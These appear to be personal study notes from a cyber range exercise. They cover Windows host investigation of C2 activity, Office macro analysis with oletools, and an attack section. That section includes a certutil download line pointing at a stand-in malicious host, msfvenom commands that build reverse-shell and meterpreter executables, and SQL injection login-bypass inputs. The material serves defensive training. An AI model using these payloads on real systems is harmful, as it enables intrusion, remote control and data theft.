<!--
Title: ASD Live Fire Exchange Programme (GitHub Markdown Version)
Author: Simon .I
Version: 2025.03.30
Description: GitHub-compatible Markdown (GHM) version using supported HTML like <details> and <table>.
-->

<!-- ASD Programme Title -->
<h1 align="center"><strong style="font-size: 4.5rem; letter-spacing: 4px; color: navy;">Australian Signals Directorate - Live Fire Exchange Program</strong></h1>

<p><strong>These are my personal notes from the <em>ASD Live Fire Cyberbitrange</em> event. This document is not provided by or affiliated with the <em>Australian Signals Directorate (ASD)</em> or <em>CyberbitRange</em>.</strong></p>

---

<details>

<summary><strong>🌐 LFE 1 Bangalore - Host-Based Threat Investigation</strong></summary>

### 🔎 Scenario: Command and Control (C2) Detection

This exercise focuses on analysing a compromised Windows host. The attacker leverages built-in Windows binaries like `certutil` and `powershell -enc` for malicious activities. The goal is to detect the infection, investigate indicators, and remove persistence and network access.

---

### 🧱 Step 1: Detect Suspicious Process Execution

Start with identifying potentially malicious running processes:

```powershell
tasklist | findstr /i "powershell cmd python wscript cscript mshta wmic rundll32 regsvr32 schtasks bitsadmin"
```

You can also use the Task Manager GUI:

```powershell
taskmgr
```

Kill any suspicious or known malicious process:

```powershell
taskkill /F /PID <PID>
```

Open Event Viewer to examine process creation logs:

```powershell
eventvwr
```

> Navigate to: Windows Logs > Security  
> Look for Event ID `4688` (Process Creation)

🧠 **Pay attention to:**

- **New Process Name**: The binary executed  
- **Creator Process Name**: What launched it  
- **Process Command Line**: (if command line logging is enabled)

Enable command line auditing via Group Policy:

`Computer Configuration > Administrative Templates > System > Audit Process Creation > Include command line in process creation events`

---

### 📥 Step 2: Investigate Certutil Abuse

Attackers often abuse `certutil` to download payloads from the internet:

```powershell
certutil -urlcache -split -f http://malicious.domain/agent.exe agent.exe
```

Check logs (Event Viewer or Sysmon if enabled) for this command line string.

---

### 🧪 Step 3: Decode Obfuscated PowerShell

If you encounter a base64 encoded PowerShell command:

```powershell
powershell.exe -enc <base64string>
```

Decode it using this:

```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<base64string>"))
```

---

### 🗓 Step 4: Investigate Scheduled Tasks

List scheduled tasks and find non-default or suspicious ones:

```powershell
schtasks /query /fo LIST /v
```

Or with PowerShell:

```powershell
Get-ScheduledTask | Where-Object {
  $_.TaskPath -notmatch "^\\Microsoft\\Windows" -and 
  ($_.Actions | ForEach-Object { $_.Execute }) -match "cmd|powershell|python|wscript|cscript|.bat|.vbs|.js|.py|mshta|rundll32|schtasks|bitsadmin"
}
```

Remove malicious scheduled task:

```powershell
Unregister-ScheduledTask -TaskName "<SuspiciousTaskName>" -Confirm:$false
```

---

### 🧼 Step 5: Registry Persistence

Check `Run` keys used to maintain persistence:

```powershell
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

Also check:

```powershell
regedit
```

---

### 🌐 Step 6: Inspect Network Connections

View active network connections and the processes behind them:

```powershell
netstat -bano
```

> Match suspicious PIDs with output from `tasklist`

---

### 📁 Step 7: Investigate Dropped Files

Search for document files and other suspicious files across users' folders:

```powershell
Get-ChildItem -Path C:\Users -Include *.docx,*.xlsx,*.pdf -File -Recurse -ErrorAction SilentlyContinue
```

---

</details>

---

<details>
<summary><strong>🌋 LFE 2 Jakarta - Multi-Stage Malware & Analysis</strong></summary>

### 🔎 Scenario: Multi-Stage Malware with Data Exfiltration

- Analyse a malicious Office macro embedded in a phishing document
- Trace execution of an obfuscated VB script delivering a reverse shell payload
- Investigate payload generated using `msfvenom` to understand its capabilities
- Identify encrypted files and inspect use of OpenSSL for local encryption
- Monitor network activity and identify exfiltration using Wireshark
- Discover and exploit an SQL injection vulnerability for unauthorised data access

### 🔎 Macro Analysis with `oletools`

`oletools` is a Python-based toolset for analysing Microsoft OLE2 files (e.g. Office documents). It helps detect malicious macros, extract metadata, and uncover indicators of compromise.

#### 🔧 Common Tools & Recursive Scans:
```powershell
# Recursively analyse all documents in a folder
olevba -r C:\Path\To\Folder\*

# Optional flags:
olevba -r --decode C:\Path\To\Folder\*
olevba -r --json C:\Path\To\Folder\*
```

#### 🔁 mraptor (manual recursion):
```powershell
Get-ChildItem -Recurse -Filter *.doc* | ForEach-Object { mraptor $_.FullName }
```

#### 📄 Other Tools:
```powershell
olemeta suspicious.doc
olemeta --json suspicious.doc

oleid suspicious.doc
oleid --json suspicious.doc

oleobj -e -d output suspicious.doc
rtfobj -d output suspicious.rtf
```

#### 🔍 Other Tool Explanations:
- `olemeta`: Extracts file metadata (author, creation date, etc.)
- `oleid`: Flags suspicious indicators (e.g. presence of macros or OLE objects)
- `oleobj`: Extracts embedded objects (e.g. a hidden .exe inside a Word file)
- `rtfobj`: Same as `oleobj`, but for RTF documents

### 💣 Payload Crafting with `msfvenom`
```powershell
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output> [-e <encoder>] [-i <iterations>] [-x <template.exe>]
```

#### 🧾 Flag Breakdown:
- `-p`: Payload type
- `LHOST`: Attacker IP
- `LPORT`: Listener port
- `-f`: Output format (e.g. exe, elf, psh)
- `-o`: Output file
- `-e`: Encoder
- `-i`: Iterations
- `-x`: Inject into another executable

#### 🧰 Examples:
```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 -f exe -o payload.exe

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 -f exe -x C:\Windows\System32\calc.exe -o mal.exe -e x86/shikata_ga_nai -i 3
```

### 🔐 File Encryption with OpenSSL
```powershell
openssl.exe enc -aes-256-cbc -base64 -in "C:\Users\cyberuser\Desktop\Files\Pass.txt" -out "C:\Users\cyberuser\Desktop\Pass.enc" -K 000001234567890ABCDEFABCDEF -iv 0
```

### 📡 Wireshark Filters
```wireshark
frame.number == 1437
frame.number >= 1434 and frame.number <= 1440
tcp.analysis.retransmission
frame.number == 1437 and tcp.analysis.retransmission
```

### 🔢 SQL Injection Basics

**SQL injection** was found in a web-based login form hosted on the compromised environment.

#### Sample Inputs:
```text
Username: ' OR 1=1;--
Password: anything

Username: admin' --
Password: anything

Username: ' OR 'a'='a';--
Password: anything

Username: " OR ""="
Password: anything

Username: ' OR 1=1 LIMIT 1;--
Password: doesn't matter

Username: admin')--
Password: test

Username: ' UNION SELECT null, version();--
Password: anything
```

#### Underlying Query Logic:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password';
```

Injecting:
```sql
SELECT * FROM users WHERE username = '' OR 1=1;--' AND password = '';
```

</details>

---
